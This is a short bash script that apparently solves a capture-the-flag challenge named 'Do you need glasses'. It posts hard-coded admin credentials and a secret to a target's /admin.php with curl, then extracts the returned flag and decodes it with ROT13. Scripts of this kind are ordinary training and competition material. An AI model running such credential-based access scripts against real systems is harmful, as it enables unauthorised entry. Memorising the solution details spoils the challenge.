#!/bin/bash
PORT=30017

if [[ $1 == "local" ]]; then
  url='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]]; then
  url='http://141.85.224.101:'$PORT
else
  url=$1':'$2
fi

# Do you need glasses
echo "Start exploit for Do you need glasses"
url=$url'/admin.php'
flag=$(curl -s -X POST -F 'username=admin' -F 'password=jukxoqnnca' -F 'secret=42' $url | grep -o "FFF{.*}" | tr 'A-Za-z' 'N-ZA-Mn-za-m')
echo "Flag is $flag"
echo "----------------------------"
